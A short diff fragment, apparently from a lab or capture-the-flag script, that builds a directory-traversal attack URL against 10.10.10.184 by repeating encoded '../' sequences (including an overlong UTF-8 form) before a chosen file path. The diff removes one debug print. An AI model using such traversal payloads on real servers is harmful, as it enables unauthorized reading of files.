@@ -34,7 +34,6 @@ elif args.e is 'u': enc = "..%c0%af"
 
 for i in range(0,args.r):
   traversal += enc
-print(traversal)
 
 #Construct attack and print for usr
 attack = "http://10.10.10.184/Pages"+traversal+args.f
